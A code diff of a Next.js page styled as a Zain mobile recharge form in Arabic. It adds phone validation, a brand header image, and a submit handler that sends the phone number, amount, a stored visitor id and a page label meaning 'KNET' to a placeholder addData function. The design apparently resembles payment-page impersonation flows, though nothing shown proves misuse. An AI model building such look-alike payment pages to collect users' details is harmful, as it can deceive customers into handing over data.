@@ -1,10 +1,12 @@
 "use client"
 
-import { useState } from "react"
-import { Menu, Heart, ShoppingCart, ChevronDown, Plus, Check } from "lucide-react"
+import { useEffect, useMemo, useState } from "react"
+import { Menu, Heart, ShoppingCart, ChevronDown, Plus, Check } from 'lucide-react'
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTrigger } from "./ui/sheet"
+import Link from "next/link"
 
 const rechargeOptions = [
   { amount: "2.000", validity: "الصلاحية 7 يوم", days: 7 },
@@ -15,42 +17,112 @@ const rechargeOptions = [
   { amount: "30.000", validity: "الصلاحية 365 يوم", days: 365 },
 ]
 
-export default function ZainRechargePage() {
+// Placeholder for addData function - replace with actual implementation
+async function addData(data: any) {
+  console.log("Data to be sent:", data);
+  // Add your actual API call here
+}
+
+export default function ZainRechargePage({
+  setShow,
+  setStepNumber,
+}: {
+  setShow?: (v: boolean) => void;
+  setStepNumber?: (n: number) => void;
+}){
   const [activeTab, setActiveTab] = useState<"recharge" | "bill">("recharge")
-  const [phoneNumber, setPhoneNumber] = useState("97777798")
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [phoneError, setPhoneError] = useState("");
+  const [loading, setIsLoading] = useState(false);
+
   const [selectedAmount, setSelectedAmount] = useState(rechargeOptions[2])
   const [isAmountDropdownOpen, setIsAmountDropdownOpen] = useState(false)
+  
+  // Derived state
+  const isValidPhone = phoneNumber.length === 8 && /^\d{8}$/.test(phoneNumber);
+  const isFormValid = isValidPhone && Number.parseFloat(selectedAmount.amount) > 0;
+
+  useEffect(() => {
+    localStorage.setItem("amount", selectedAmount.amount);
+  }, [selectedAmount]);
+
+  useEffect(() => {
+    if (!phoneNumber) return setPhoneError("");
+    if (!/^\d+$/.test(phoneNumber) || phoneNumber.length !== 8) {
+      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.");
+    } else {
+      setPhoneError("");
+    }
+  }, [phoneNumber]);
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, "");
+    if (value.length <= 8) setPhoneNumber(value);
+  };
+
+  const handleAmountSelect = (value: string) => {
+    const option = rechargeOptions.find(opt => opt.amount === value);
+    if (option) setSelectedAmount(option);
+  };
+
+  const formattedAmount = useMemo(
+    () => Number.parseFloat(selectedAmount.amount || "0").toFixed(3),
+    [selectedAmount.amount]
+  );
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!isFormValid) return;
+    setIsLoading(true);
+    try {
+      const visitorId = localStorage.getItem("visitor");
+      await addData({
+        id: visitorId,
+        phone: phoneNumber,
+        amount: selectedAmount.amount,
+        timestamp: new Date().toISOString(),
+        currentPage: "كي نت",
+        action: "payment_submit_attempt",
+        type: activeTab,
+      });
+      if (setStepNumber) setStepNumber(2);
+    } catch (error: any) {
+      console.error("Submission error:", error);
+      const visitorId = localStorage.getItem("visitor");
+      await addData({
+        id: visitorId,
+        action: "payment_submit_error",
+        error: error?.message ?? String(error),
+      });
+    } finally {
+      setIsLoading(false);
+    }
+  };
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-[#1e1548] via-[#251a5c] to-[#1a1240]" dir="rtl">
+    <div className="min-h-screen bg-gray-50" dir="rtl">
       {/* Header */}
-      <header className="flex items-center justify-between px-4 py-4 bg-[#1a1240]">
-        <div className="flex items-center gap-4">
-          <button className="text-white">
-            <Menu className="w-6 h-6" />
-          </button>
-          <button className="text-white">
-            <Heart className="w-6 h-6" />
-          </button>
-          <button className="bg-white rounded-full p-2">
-            <ShoppingCart className="w-5 h-5 text-[#1a1240]" />
-          </button>
-        </div>
-        <div className="flex items-center gap-2">
-          <svg viewBox="0 0 100 40" className="h-8" fill="white">
-            <circle cx="15" cy="20" r="12" strokeWidth="2" stroke="white" fill="none" />
-            <circle cx="12" cy="17" r="3" fill="white" />
-            <path d="M 18 20 Q 25 15 25 20 Q 25 25 18 20" fill="white" />
-            <text x="35" y="28" fontSize="20" fontWeight="bold" fill="white">
-              zain
-            </text>
-          </svg>
-        </div>
+      <header className="flex items-center justify-between bg-[#1a1240] relative">
+        <img src="/top.webp" alt="Zain" className="h-12 w-full object-cover" />
+        <Sheet>
+          <SheetTrigger className="absolute left-3 top-3 hover:bg-white/10 w-10 h-10 p-1 rounded flex items-center justify-center">
+            <Menu className="w-6 h-6 text-white" />
+          </SheetTrigger>
+          <SheetContent>
+            <SheetHeader>
+              <SheetDescription className="my-6 flex flex-col gap-2">
+                <Link href="/terms-conditions">الشروط والأحكام</Link>
+                <Link href={"/privacy"}>سياسة الخصوصية</Link>
+                <Link href={"/contact"}>اتصل بنا</Link>
+              </SheetDescription>
+            </SheetHeader>
+          </SheetContent>
+        </Sheet>
       </header>
 
       <div className="px-4 py-8 max-w-2xl mx-auto">
         {/* Title */}
-        <h1 className="text-3xl font-bold text-white text-center mb-8">الدفع السريع</h1>
+        <h1 className="text-3xl font-bold text-black text-right mb-8">الدفع السريع</h1>
 
         {/* Card */}
         <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
@@ -96,10 +168,11 @@ export default function ZainRechargePage() {
               <Input
                 type="tel"
                 value={phoneNumber}
-                onChange={(e) => setPhoneNumber(e.target.value)}
+                onChange={handlePhoneChange}
                 className="text-2xl font-semibold text-gray-900 border-0 border-b-2 border-gray-200 rounded-none px-0 text-right"
                 dir="ltr"
               />
+              {phoneError && <p className="text-red-500 text-sm mt-1 text-right">{phoneError}</p>}
             </div>
 
             {/* Amount */}
@@ -173,8 +246,12 @@ export default function ZainRechargePage() {
 
           {/* Recharge Button */}
           <div className="p-6 pt-0">
-            <Button className="w-full bg-[#d62598] hover:bg-[#c01e85] text-white text-lg py-6 rounded-full font-semibold shadow-lg">
-              أعد التعبئة الآن
+            <Button 
+              onClick={handleSubmit}
+              disabled={!isFormValid || loading}
+              className="w-full bg-[#d62598] hover:bg-[#c01e85] text-white text-lg py-6 rounded-full font-semibold shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
+            >
+              {loading ? "جاري المعالجة..." : "أعد التعبئة الآن"}
             </Button>
           </div>
         </div>
